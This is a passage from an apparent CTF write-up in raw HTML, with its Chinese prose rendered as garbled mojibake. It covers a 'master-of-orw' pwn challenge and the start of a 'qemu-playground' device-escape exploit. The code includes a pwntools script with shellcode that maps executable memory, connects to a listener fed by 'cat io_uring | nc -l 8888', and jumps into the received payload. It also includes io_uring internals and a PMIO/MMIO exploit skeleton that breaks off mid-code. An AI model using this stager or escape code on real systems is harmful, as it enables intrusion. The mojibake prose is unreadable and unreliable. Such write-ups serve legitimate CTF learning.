class="hljs-title">io_uring_cqe</span> *<span class="hljs-title">cqe</span>;</span><br>    <span class="hljs-keyword">if</span> (io_uring_wait_cqe(&amp;ring, &amp;cqe) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;io_uring_wait_cqe&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>   <br>    <span class="hljs-comment">// æäº¤æ‰€æœ‰æ“ä½œ</span><br>    io_uring_submit(&amp;ring);<br><br>    <span class="hljs-comment">// æ¸…ç†</span><br>    io_uring_cq_advance(&amp;ring, <span class="hljs-number">2</span>);<br>    io_uring_queue_exit(&amp;ring);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Socket_struct</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> *<span class="hljs-title">serv_addr</span> =</span> <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in));<br>    <span class="hljs-built_in">memset</span>(serv_addr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in));<br>    serv_addr-&gt;sin_family = AF_INET;<br>    serv_addr-&gt;sin_addr.s_addr = inet_addr(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<br>    serv_addr-&gt;sin_port = htons(<span class="hljs-number">8888</span>);<br>    print_binary(serv_addr,<span class="hljs-number">16</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ç»ˆç«¯å¼€</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cat io_uring <span class="hljs-string">| nc -l 8888</span><br></code></pre></td></tr></table></figure><p>å†æ‰§è¡Œexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> ctypes<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;43.132.193.22&#x27;</span>, <span class="hljs-number">9998</span>)<br><span class="hljs-keyword">else</span>:<br>    r = process(<span class="hljs-string">&#x27;./master-of-orw&#x27;</span>)<br>    p = process(<span class="hljs-string">&quot;./master-of-orw&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>socket_struct = <span class="hljs-number">0x020022b87f000001</span><br>asm_socket = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rax, 41</span><br><span class="hljs-string">mov rdi, 2</span><br><span class="hljs-string">mov rsi, 1</span><br><span class="hljs-string">xor rdx, rdx</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>push_socket_struct = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov r15, 0x0100007fb8220002</span><br><span class="hljs-string">push r15</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>asm_connect = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">mov rdi, 3</span><br><span class="hljs-string">mov rdx, 0x10</span><br><span class="hljs-string">mov rax, 42</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>cyc_recv = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rsi, 0x400000</span><br><span class="hljs-string">mov r14, 0xcfcc8</span><br><span class="hljs-string"></span><br><span class="hljs-string">again:</span><br><span class="hljs-string">mov edi, 3</span><br><span class="hljs-string">mov rdx, 0x1000</span><br><span class="hljs-string">mov r10d, 0</span><br><span class="hljs-string">xor r8d, r8d</span><br><span class="hljs-string">xor r9d, r9d</span><br><span class="hljs-string">mov eax, 45 ;// recvfrom</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">add rsi, rax</span><br><span class="hljs-string">sub r14, rax</span><br><span class="hljs-string">cmp r14,0</span><br><span class="hljs-string">jge again</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x401620</span><br><span class="hljs-string">ret</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode = asm(shellcraft.mmap(<span class="hljs-number">0x400000</span>,<span class="hljs-number">0x100000</span>,<span class="hljs-number">7</span>,<span class="hljs-number">33</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)) + \<br>            asm(asm_socket) + asm(push_socket_struct) + asm(asm_connect) + \<br>            asm(cyc_recv)<br><br><br><br>sl(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/img/ACTF/7.png" alt="img"></p><h3 id="é¢˜ç›®ä¹‹å¤–â€“about-io-uring"><a href="#é¢˜ç›®ä¹‹å¤–â€“about-io-uring" class="headerlink" title="é¢˜ç›®ä¹‹å¤–â€“about io_uring"></a>é¢˜ç›®ä¹‹å¤–â€“about io_uring</h3><p>æºç åº·<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/io_uring.h">è¿™é‡Œ</a></p><p>io_uring_opè¿˜æŒºä¸°å¯Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">io_uring_op</span> &#123;</span><br>IORING_OP_NOP,<br>IORING_OP_READV,<br>IORING_OP_WRITEV,<br>IORING_OP_FSYNC,<br>IORING_OP_READ_FIXED,<br>IORING_OP_WRITE_FIXED,<br>IORING_OP_POLL_ADD,<br>IORING_OP_POLL_REMOVE,<br>IORING_OP_SYNC_FILE_RANGE,<br>IORING_OP_SENDMSG,<br>IORING_OP_RECVMSG,<br>IORING_OP_TIMEOUT,<br>IORING_OP_TIMEOUT_REMOVE,<br>IORING_OP_ACCEPT,<br>IORING_OP_ASYNC_CANCEL,<br>IORING_OP_LINK_TIMEOUT,<br>IORING_OP_CONNECT,<br>IORING_OP_FALLOCATE,<br>IORING_OP_OPENAT,<br>IORING_OP_CLOSE,<br>IORING_OP_FILES_UPDATE,<br>IORING_OP_STATX,<br>IORING_OP_READ,<br>IORING_OP_WRITE,<br>IORING_OP_FADVISE,<br>IORING_OP_MADVISE,<br>IORING_OP_SEND,<br>IORING_OP_RECV,<br>IORING_OP_OPENAT2,<br>IORING_OP_EPOLL_CTL,<br>IORING_OP_SPLICE,<br>IORING_OP_PROVIDE_BUFFERS,<br>IORING_OP_REMOVE_BUFFERS,<br>IORING_OP_TEE,<br>IORING_OP_SHUTDOWN,<br>IORING_OP_RENAMEAT,<br>IORING_OP_UNLINKAT,<br>IORING_OP_MKDIRAT,<br>IORING_OP_SYMLINKAT,<br>IORING_OP_LINKAT,<br>IORING_OP_MSG_RING,<br>IORING_OP_FSETXATTR,<br>IORING_OP_SETXATTR,<br>IORING_OP_FGETXATTR,<br>IORING_OP_GETXATTR,<br>IORING_OP_SOCKET,<br>IORING_OP_URING_CMD,<br>IORING_OP_SEND_ZC,<br>IORING_OP_SENDMSG_ZC,<br><br><span class="hljs-comment">/* this goes last, obviously */</span><br>IORING_OP_LAST,<br>&#125;;<br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°äº†åç§»é‡çš„è®¾ç½®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_SQ_RING0ULL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_CQ_RING0x8000000ULL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_SQES0x10000000ULL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_PBUF_RING0x80000000ULL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_PBUF_SHIFT16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_MMAP_MASK0xf8000000ULL</span><br><br>IORING_OFF_SQ_RINGï¼šè¿™æ˜¯ç”¨äºè®¿é—® Submission Queue Ringï¼ˆSQ Ringï¼‰çš„åç§»é‡ã€‚SQ Ring ç”¨äºå­˜å‚¨I/Oè¯·æ±‚çš„æäº¤é˜Ÿåˆ—<br><br>IORING_OFF_SQESï¼šè¿™æ˜¯ç”¨äºè®¿é—® Submission Queue Entryï¼ˆSQEï¼‰çš„åç§»é‡ã€‚SQE æ˜¯I/Oè¯·æ±‚çš„æ•°æ®ç»“æ„ï¼Œç”¨äºæè¿°I/Oæ“ä½œçš„å„ä¸ªå‚æ•°ã€‚<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆå¯¹åº”ç¬¬ä¸€ä¸ªmmapçš„offset&#x3D;0ï¼Œç¬¬äºŒä¸ªmmapçš„offset&#x3D;0x10000000</p><h2 id="qemu-playground"><a href="#qemu-playground" class="headerlink" title="qemu-playground"></a>qemu-playground</h2><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>ğŸ‘´å…ˆå£°æ˜ï¼Œè¿™æ˜¯ğŸ‘´äººç”Ÿä¸­ç¬¬ä¸€ä¸ªé€†å‘é¢˜ï¼ŒğŸ‘´è¿é‚£ä¸ªæ ¸å¿ƒç®—æ³•éƒ½æ²¡çœ‹æ˜ç™½ã€‚ğŸ‘´è¾“å…¥äº†åŸå§‹æ•°æ®è¯•ä¸€ä¸‹ï¼Œå†æŠŠå¾—åˆ°çš„æ•°æ®è¾“è¿›å»ï¼Œç„¶åï¼Œå°±æ²¡æœ‰ç„¶åäº†ï¼ŒğŸ‘´å°±æ‹¿åˆ°äº†flag</p><p><img src="/img/ACTF/8.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-comment">// #define PAGE_SHIFT 12</span><br><span class="hljs-comment">// #define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT) // 4096</span><br><span class="hljs-comment">// #define PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-comment">// #define PFN_PFN ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-comment">// #define PMIO_BASE 0x000000000000c000</span><br><span class="hljs-comment">// #define CSR(_x) ((_x) &lt;&lt; 3)</span><br><span class="hljs-comment">// #define CSR5_TS_SUSPENDED 6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMIO_BASE 0XC040</span><br><br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* mmio_mem;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> *((<span class="hljs-type">uint64_t</span> *)(mmio_mem + addr));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span><br>&#123;<br>    *((<span class="hljs-type">uint32_t</span>*)(mmio_mem + addr)) = value;<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">pmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> value)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> inl(PMIO_BASE + value);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span><br>&#123;<br>    outb(value,PMIO_BASE+addr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_value</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr, <span class="hljs-type">uint64_t</span> value)</span><br>&#123;<br>    mmio_write(addr,value&amp;<span class="hljs-number">0xffffffff</span>);<br>    mmio_write(addr+<span class="hljs-number">4</span>,value&gt;&gt;<span class="hljs-number">32</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> mmio_fd = open(<span 